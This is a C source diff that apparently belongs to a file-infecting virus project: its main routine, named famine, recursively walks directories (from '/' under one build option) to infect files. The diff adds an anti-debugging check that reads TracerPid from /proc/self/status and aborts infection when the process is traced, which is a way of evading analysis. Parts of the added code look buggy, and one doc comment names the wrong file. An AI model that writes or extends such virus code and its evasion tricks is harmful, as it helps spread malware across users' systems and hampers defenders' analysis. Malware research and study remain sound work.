@@ -10,6 +10,7 @@
 #include <stdint.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
+#include <sys/ptrace.h>
 #include "elf_reader.h"
 #include "utils.h"
 #include "encrypt.h"
@@ -21,6 +22,8 @@
 
 #define BUF_SIZE	(32 * 1024)
 #define PATH_INIT	4096
+#define STATUS_TRACERPID "TracerPid:"
+#define STATUS_TRACERPID_LEN 10
 
 // ---
 // Static variables
@@ -97,6 +100,12 @@ static void				_encrypt(
 							t_ranges *ranges,
 							const char *key);
 
+static bool				_is_traced();
+
+/** @brief Read /proc/self/maps into a buffer. */
+static size_t			_read_status(
+							char **buf);
+
 // ---
 // Extern function definitions
 // ---
@@ -153,6 +162,10 @@ void	famine(
 	_packer64_bin_start = packer64_start;
 	_packer64_bin_end = packer64_end;
 
+	if (_is_traced()) {
+		verbose("traced abort infection\n");
+		return ;
+	}
 #ifdef INFECT_FULL_PATH
 	_list_recursive("/", _infect, nullptr);
 #else
@@ -358,6 +371,58 @@ static void	_encrypt(
 	}
 	// auto const start_off = ALIGN_UP(ranges->data[ranges->len - 1].off + ranges->data[ranges->len - 1].len, 8);
 	// xtea_encrypt((char *)s->data + start_off, ALIGN_DOWN((off_t)(s->size - start_off), 8), (const uint32_t *)"1234567812345678");
+}
+
+static bool _is_traced() {
+	char	*s;
+	char	*status;
+	size_t	status_size = _read_status(&status);
+	bool	traced = false;
+
+	if (status_size == 0)
+		return (false);
+
+	s = status;
+	while (*s != '\0') {
+		if (strncmp(s, STATUS_TRACERPID, STATUS_TRACERPID_LEN) == 0) {
+			s += STATUS_TRACERPID_LEN;
+			while (*s == '\t' || *s == ' ')
+				++s;
+			if (strncmp(s, "0", 1) != 0)
+				traced = true;
+		}
+		while (*s != '\n' && *s != '\0')
+			++s;
+		while (*s == '\n')
+			++s;
+	}
+	munmap(status, status_size);
+	return (traced);
+}
+
+/** @brief Read /proc/self/maps into a buffer. */
+static size_t	_read_status(char **buf)
+{
+	int	fd = open("/proc/self/status", O_RDONLY);
+	size_t	size = 0x1000;
+	*buf = mmap(nullptr, size, PROT_READ | PROT_WRITE,
+		MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	size_t	off = 0;
+	ssize_t	ret;
+	while ((ret = read(fd, (char *)*buf + off, 0x1000)) != 0) {
+		off += ret;
+		if (off + 0x1000 > size) {
+			*buf = mremap(*buf, size, size + 0x1000, MREMAP_MAYMOVE);
+			size += 0x1000;
+		}
+	}
+	close(fd);
+	if (ret < 0) {
+		munmap(buf, size);
+		return (0);
+	}
+	((char *)*buf)[off + ret] = '\0';
+	return (size);
 }
 
 static t_buf __buf_new(
